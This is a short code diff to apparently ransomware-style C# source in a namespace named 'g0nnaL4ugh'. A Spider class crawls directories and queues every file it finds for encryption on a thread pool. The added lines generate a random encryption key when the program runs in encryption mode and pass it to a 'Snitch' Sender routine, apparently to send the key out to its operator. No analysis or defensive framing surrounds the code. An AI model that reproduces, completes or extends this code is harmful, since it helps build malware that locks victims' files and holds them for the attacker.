@@ -7,6 +7,7 @@ using System.Diagnostics;
 using System.IO;
 using g0nnaL4ugh.Crypto;
 using g0nnaL4ugh.Finder;
+using g0nnaL4ugh.Snitch;
 
 namespace g0nnaL4ugh
 {
@@ -31,6 +32,7 @@ namespace g0nnaL4ugh
         List<Node> nodes;
         Encrypter encrypter;
         Decrypter decrypter;
+        private string password;
 
         public Spider(string[] paths, Encrypter encrypter)
         {
@@ -53,8 +55,12 @@ namespace g0nnaL4ugh
             *  - Encrypt
             *  - Decrypt
             */
-            /* string randomString = Encrypter.generateRandomPrivateKey(32);
-            Console.WriteLine(randomString);*/
+			if (this.IsEncryptionMode())
+			{
+				this.password = this.encrypter.GenerateRandomPrivateKey();
+				Sender.SnitchPwd(this.password);
+			}
+			    
             foreach (string path in this.initialPaths)
             {
 #if DEBUG
@@ -80,9 +86,8 @@ namespace g0nnaL4ugh
 
             foreach(string filePath in files)
             {
-                TaskObject taskObject = new TaskObject(filePath, db);
+				TaskObject taskObject = new TaskObject(filePath, db);
                 ThreadPool.QueueUserWorkItem(new WaitCallback(ProcessFile2EncCallback2), taskObject);
-                // this.ProcessFile2EncCallback2(filePath);	
             }
 
             foreach(string dir in childDirectories)
